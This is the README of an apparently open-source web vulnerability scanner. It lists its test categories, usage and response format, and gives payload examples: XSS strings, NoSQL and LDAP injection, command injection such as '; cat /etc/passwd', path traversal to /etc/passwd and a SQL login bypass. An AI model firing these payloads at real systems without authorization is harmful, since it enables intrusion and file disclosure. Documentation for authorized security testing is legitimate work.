# Advanced Bug Scanner

## Overview
The Advanced Bug Scanner is a comprehensive security testing tool that detects modern web application vulnerabilities using sophisticated attack techniques and payloads.

## Features

### 🔥 **Advanced XSS Detection**
- **DOM-based XSS** - Detects client-side XSS vulnerabilities
- **Stored XSS** - Identifies persistent XSS attacks
- **Filter Bypass** - Tests various encoding and obfuscation techniques
- **Event Handlers** - Checks for event-based XSS vectors
- **CSS Injection** - Tests CSS-based XSS attacks
- **Data URI** - Validates data URI XSS vectors
- **Unicode Bypass** - Tests Unicode encoding bypasses

### 💰 **Business Logic Vulnerabilities**
- **Price Manipulation** - Tests e-commerce price tampering
- **Race Conditions** - Detects concurrent request vulnerabilities
- **Workflow Bypass** - Identifies business process bypasses
- **State Manipulation** - Tests application state tampering

### 🌐 **HTTP Parameter Pollution (HPP)**
- **Parameter Override** - Tests parameter value overriding
- **Array Injection** - Tests array parameter manipulation
- **Logic Bypass** - Identifies parameter-based logic bypasses

### 🗄️ **NoSQL Injection**
- **MongoDB Injection** - Tests MongoDB query injection
- **CouchDB Injection** - Validates CouchDB vulnerabilities
- **Cassandra Injection** - Tests Cassandra query injection
- **Query Manipulation** - Tests NoSQL query tampering

### 👥 **LDAP Injection**
- **Query Injection** - Tests LDAP query manipulation
- **Filter Bypass** - Identifies LDAP filter bypasses
- **Authentication Bypass** - Tests LDAP auth bypass techniques

### 💻 **Command Injection**
- **OS Commands** - Tests operating system command injection
- **Shell Injection** - Validates shell command vulnerabilities
- **Script Injection** - Tests script execution vulnerabilities

### 📁 **Path Traversal**
- **Directory Traversal** - Tests file system access vulnerabilities
- **Encoding Bypass** - Tests various encoding techniques
- **Protocol Handlers** - Validates protocol-based attacks
- **Filter Bypass** - Tests path traversal filter bypasses

### 🔐 **Authentication Bypass**
- **SQL Injection** - Tests SQL injection in authentication
- **NoSQL Injection** - Tests NoSQL injection in auth
- **LDAP Injection** - Tests LDAP injection in auth
- **Default Credentials** - Tests common default credentials
- **Logic Bypass** - Identifies authentication logic flaws

### 🔑 **Session Management Issues**
- **Session Fixation** - Tests session ID regeneration
- **Session Timeout** - Validates session expiration
- **Session Hijacking** - Tests session security
- **Concurrent Sessions** - Tests multiple session handling

### 🛡️ **Cryptographic Weaknesses**
- **Weak Algorithms** - Identifies weak encryption algorithms
- **Hardcoded Keys** - Finds hardcoded cryptographic keys
- **Key Management** - Tests key generation and storage
- **Hash Weaknesses** - Identifies weak hashing algorithms

### 👁️ **Information Disclosure**
- **Sensitive Data** - Finds exposed sensitive information
- **Error Messages** - Identifies information leakage in errors
- **Debug Information** - Tests debug data exposure
- **Version Information** - Finds version disclosure

## Usage

### Basic Usage
```javascript
const AdvancedBugScanner = require('./services/advancedBugScanner');
const scanner = new AdvancedBugScanner();

// Scan for advanced bugs
const results = await scanner.scanAdvancedBugs('https://example.com');
console.log(results);
```

### Advanced Usage
```javascript
// Scan with specific categories
const results = await scanner.scanAdvancedBugs('https://example.com', {
  categories: {
    advancedXSS: true,
    businessLogic: true,
    hpp: false,
    nosqlInjection: true
  }
});
```

### API Endpoint
```bash
POST /api/scans/advanced-bug-scan
Content-Type: application/json

{
  "targetUrl": "https://example.com",
  "categories": {
    "advancedXSS": true,
    "businessLogic": true,
    "hpp": true,
    "nosqlInjection": true,
    "ldapInjection": true,
    "commandInjection": true,
    "pathTraversal": true,
    "authBypass": true,
    "sessionIssues": true,
    "cryptoWeaknesses": true,
    "infoDisclosure": true
  }
}
```

## Payload Examples

### Advanced XSS Payloads
```javascript
// DOM-based XSS
'<script>alert("DOM-XSS")</script>'
'<img src=x onerror=alert("DOM-XSS")>'
'<svg onload=alert("DOM-XSS")>'

// Filter bypass
'<ScRiPt>alert("Bypass")</ScRiPt>'
'<script>alert(String.fromCharCode(88,83,83))</script>'

// Event handlers
'<div onmouseover="alert(1)">XSS</div>'
'<input onfocus="alert(1)" autofocus>'

// CSS injection
'<style>@import\'javascript:alert("XSS")\';</style>'
'<link rel="stylesheet" href="javascript:alert(\'XSS\')">'

// Data URI
'data:text/html,<script>alert("XSS")</script>'

// Unicode bypass
'\u003cscript\u003ealert("XSS")\u003c/script\u003e'
'&#60;script&#62;alert("XSS")&#60;/script&#62;'
```

### Business Logic Payloads
```javascript
// Price manipulation
{ price: -1, quantity: 1 }
{ price: 0, quantity: 1 }
{ price: 0.01, quantity: 999999 }

// Race condition testing
// Multiple concurrent requests to test race conditions
```

### NoSQL Injection Payloads
```javascript
// MongoDB injection
'{"$ne": null}'
'{"$gt": ""}'
'{"$regex": ".*"}'
'{"$where": "this.username == this.password"}'
'{"$or": [{"username": "admin"}, {"username": "administrator"}]}'
```

### LDAP Injection Payloads
```javascript
'*'
'*)(uid=*))(|(uid=*'
'*)(|(password=*'
'*)(|(objectClass=*'
'admin)(&(password=*'
```

### Command Injection Payloads
```javascript
'; ls'
'| ls'
'& ls'
'` ls `'
'$( ls )'
'; cat /etc/passwd'
'| cat /etc/passwd'
'& cat /etc/passwd'
```

### Path Traversal Payloads
```javascript
'../../../etc/passwd'
'..\\..\\..\\windows\\system32\\drivers\\etc\\hosts'
'....//....//....//etc/passwd'
'..%2F..%2F..%2Fetc%2Fpasswd'
'..%252F..%252F..%252Fetc%252Fpasswd'
'/etc/passwd'
'C:\\windows\\system32\\drivers\\etc\\hosts'
'file:///etc/passwd'
'php://filter/read=convert.base64-encode/resource=index.php'
```

## Response Format

```javascript
{
  "advancedXSS": [
    {
      "type": "Advanced XSS",
      "payload": "<script>alert('XSS')</script>",
      "location": "URL parameter",
      "severity": "High",
      "evidence": "XSS payload executed"
    }
  ],
  "businessLogic": [
    {
      "type": "Price Manipulation",
      "payload": { "price": -1, "quantity": 1 },
      "vulnerable": true,
      "evidence": "Price manipulation accepted"
    }
  ],
  "hpp": [
    {
      "url": "https://example.com?id=1&id=2",
      "payload": "id=1&id=2",
      "vulnerable": true,
      "evidence": "Parameter pollution detected"
    }
  ],
  "nosqlInjection": [
    {
      "url": "https://example.com",
      "payload": "{\"$ne\": null}",
      "vulnerable": true,
      "evidence": "NoSQL injection successful"
    }
  ],
  "ldapInjection": [
    {
      "url": "https://example.com",
      "payload": "*",
      "vulnerable": true,
      "evidence": "LDAP injection successful"
    }
  ],
  "commandInjection": [
    {
      "url": "https://example.com?cmd=; ls",
      "payload": "; ls",
      "vulnerable": true,
      "evidence": "Command injection successful"
    }
  ],
  "pathTraversal": [
    {
      "url": "https://example.com?file=../../../etc/passwd",
      "payload": "../../../etc/passwd",
      "vulnerable": true,
      "evidence": "Path traversal successful"
    }
  ],
  "authBypass": [
    {
      "url": "https://example.com/login",
      "payload": "' OR '1'='1' --",
      "vulnerable": true,
      "evidence": "Authentication bypass successful"
    }
  ],
  "sessionIssues": [
    {
      "type": "Session Fixation",
      "vulnerable": true,
      "evidence": "Session ID not regenerated after login"
    }
  ],
  "cryptoWeaknesses": [
    {
      "type": "Weak Encryption",
      "vulnerable": true,
      "evidence": "Weak cryptographic algorithms detected"
    }
  ],
  "infoDisclosure": [
    {
      "type": "Sensitive Information",
      "vulnerable": true,
      "evidence": "Sensitive data exposed: password=test123"
    }
  ],
  "vulnerabilities": [
    {
      "name": "Advanced XSS",
      "severity": "High",
      "description": "Advanced XSS vulnerability detected with payload: <script>alert('XSS')</script>",
      "poc": "Test with: <script>alert('XSS')</script>",
      "remediation": "Implement proper input validation and output encoding"
    }
  ]
}
```

## Security Considerations

### ⚠️ **Important Notes**
- Only test on authorized systems
- Follow responsible disclosure practices
- Be aware of legal implications
- Use in controlled environments
- Respect rate limits and terms of service

### 🛡️ **Best Practices**
- Test in isolated environments
- Use proper authentication
- Implement rate limiting
- Log all scanning activities
- Follow ethical hacking guidelines

## Installation

```bash
# Install dependencies
npm install axios cheerio puppeteer

# Install the scanner
npm install ./services/advancedBugScanner.js
```

## Configuration

```javascript
const scanner = new AdvancedBugScanner({
  userAgent: 'Custom User Agent',
  timeout: 30000,
  maxConcurrent: 5
});
```

## Contributing

1. Fork the repository
2. Create a feature branch
3. Add new vulnerability tests
4. Update documentation
5. Submit a pull request

## License

This project is licensed under the MIT License - see the LICENSE file for details.

## Support

For support and questions:
- Create an issue on GitHub
- Check the documentation
- Review the examples
- Join the community discussions

---

**⚠️ Disclaimer: This tool is for educational and authorized testing purposes only. Use responsibly and in accordance with applicable laws and regulations.**
